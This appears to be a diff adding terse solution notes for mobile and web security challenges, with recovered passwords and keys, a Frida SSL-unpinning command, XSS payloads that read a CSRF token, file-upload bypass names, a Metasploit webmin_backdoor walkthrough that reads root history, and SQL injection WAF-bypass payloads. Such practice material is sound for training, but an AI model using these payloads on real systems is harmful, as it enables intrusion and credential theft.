@@ -1,0 +1,141 @@
+1: <string name="Pstr">Rand0mP@ss1</string>
+   <string name="Ustr">RandomUser1</string>
+         -----------------
+   /data/data/hpandro.java.infosec.backdooor2/files/secret_user.pwd
+    87b11b83b1
+   /data/data/hpandro.java.infosec.backdooor2/files/secret_pass.pwd
+    a50985d727
+-------------------------------------------
+2: Username : 8c7e94d8dc82
+   Password : 9fc8da29c210
+-------------------------------------------------
+3: Root Bypass | SSL unpinning
+    used sysExit.js
+    frida --codeshare akabe1/frida-multiple-unpinning -f com.netsquare.enigmaexam -l sysExit.js
+-----------------------------------------
+4: exported=true
+    adb shell am start -n com.netsquare.enigmachallenge/com.netsquare.enigmachallenge.EnigmaChallenge
+        XZBX28137CR7AWFGDG42UEOXPOFQSO8V
+-------------------------------------------
+5: 2fa
+    admin
+    admin
+    Intercept the request check the response 
+        OTP
+-------------------------------------------------
+
+Vkd0a1ZrMXJOVlZaZWtKT1lsWkZlRlJZY0ZwTlZUVnhWRlJPVDFaSFRqVlViWEJXWlZVeE5sUlliRTVsYkVZMlZHMXdUazVWTVRaaE0zQlBaV3N3ZDFSWWNISmxhemxWVkZSQ1RtRnJNRGs9:Net-Secure#2469974994# (HEX)(https://github.com/s0md3v/Decodify)
+bbbdd9057189c4ee422bb93be7625c8769f590ab:philippe (MD5)(https://hashes.com/en/decrypt/hash)(https://www.onlinehashcrack.com/hash-identification.php)
+2FpVVEx4NN9IIvF4jLQF0CNG6HQGk4HQ4zQqng/ILuk=:Net-Secure#7274293647# (AES)(https://www.devglan.com/online-tools/aes-encryption-decryption)
+
+-------------------------------------------
+var _0x0f1337 = ["\x33","\x32","\x31","\x40","\x64","\x72","\x30","\x77","\x73","\x73","\x61","\x50"];
+var password=_0x0f1337[11]+_0x0f1337[10]+_0x0f1337[9]+_0x0f1337[8]+_0x0f1337[7]+_0x0f1337[6]+_0x0f1337[5]+_0x0f1337[4]+_0x0f1337[3]+_0x0f1337[2]+_0x0f1337[1]+_0x0f1337[0];
+
+var password="P""+"a"+"s"+"s"+"w"+"0"+"r"+"d"+"@"+"1"+"2"+"3";
+
+-------------------------------------------
+Application have 2000 user, Your User ID is 1999 : User Name is "NS-ADMIN" and Password is "WhAti5MyPa55"
+----------------------------
+Local Storage NS_KEY:Y93xibcFwYWHXr7N2J5Atxo4iEWiU35n
+Session Storage NS_KEY:tvBpfjMLXFFUnMToKxD4BAhdG0tSrFVN
+IndexedDB NS_KEY: nsdb = "7GhHBQpSDdyxp5XRASosupITGsuyiHTL" ;
+Web SQL NS_KEY:	PzuR7lHlaHfg8UDkHtarbVZyXDUbp0sc
+Web Socket ws:// NS_KEY: npEOso8FTV09AiHtcrmnKiHg9aceIH0f
+
+-------------------------------------
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJOZXQgU3F1YXJlIFNvbHV0aW9ucyBQcml2YXRlIExpbWl0ZWQiLCJpYXQiOjE2MDA5MDQyMTAsImV4cCI6MTYzMjQ0MDIxMSwiYXVkIjoiRW5pZ21hIiwic3ViIjoiMjU2LWJpdC1zZWNyZXQgaXMgc2VjcmV0IHdpdGggSFMyNTYiLCJ1c2VyIjoiYWRtaW4iLCJsb2dpbiI6IjEifQ.1T72kXgjsd3QhdsMe-U11bXoO3Ie54iJ4xjN5XvDl7I
+-----------------------------------
+">var+csrf=+document.getElementById("csrf_token").value;<img+src="x"+onmouseover="alert(CSRFTOKEN:+csrf)">
+-----------------------------------
+
+">var+csrf=+document.getElementById("csrf_token").value;<img+src="x"+onmouseover="aLERt(1)">
+---------------------------------------
+rstuvwxy-78901234-12345678-41781337
+
+-------------------------------------
+user=netsquare&pass=%2f%2f%2a
+1679068cfb6bb2f194de148cb8c803ae
+
+----------------------------------------
+1b6453892473a467d07372d45eb05abc2031647a:NQ==:f06065967ad418ca
+---------------------------------------
+26012000
+
+------------------------------
+User ID : 1043 
+User Name : HAROLD
+Pass: bigsexy
+
+-----------------------
+#NetSquare#tPHAlnw9nP#
+
+---------------------------------
+
+HTTP/1.1 200 OK
+Date: Sun, 19 Sep 2021 07:24:32 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Access-Control-Allow-Origin: *
+Content-Length: 32
+Connection: close
+Content-Type: application/json
+
+{"VALID":"Success","OTP":"6268"}
+
+XZBX28137CR7AWFGDG42UEOXPOFQSO8V
+----------------------------------------
+
+demo.txt
+demo.jsp
+demo.jsp.txt
+demo.jsp%20.txt
+demo.jsp:txt
+--------------------------------------------
+http://192.168.2.246:8080/secret.txt
+NS-7153612E727C9C91CD5F
+
+------------------------------------
+Virtual Box Network(Bridge)
+> nmap -p- -sV IP
+> sudo msfconsole
+> search webmin
+> use exploit/linux/http/webmin_backdoor
+> set RHOST VM_IP
+> set RPORT WEBMIN_PORT
+> set LHOST L_PORT
+> set LPORT RAND_PORT
+> run
+find / -type f | grep history
+cat /root/.ash_history
+cat /etc/proof.txt
+--------------------------------------
+
+SQL WAF Bypass
+
+    Normal
+> col=YXV0aG9y&wval=RHViYWknIG9yZGVyIGJ5IDMtLSAt                               (Base64)
+> col=10-9-21=Dubai
+
+    Error payload
+> col=10-9-21=Dubai'
+
+    Order By
+> col=10-9-21=Dubai' OrDer bY 1-- -   No error
+    .
+    .
+    .
+  col=10-9-21=Dubai' OrDer bY 4-- -    Error
+
+    Union
+> col=10-9-21=Dubai' UnIon all SElecT 1,null,null-- -
+> col=10-9-21=Dubai' UnIon all SElecT null,null,null,null-- -
+
+
+
+
+
+
+
+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
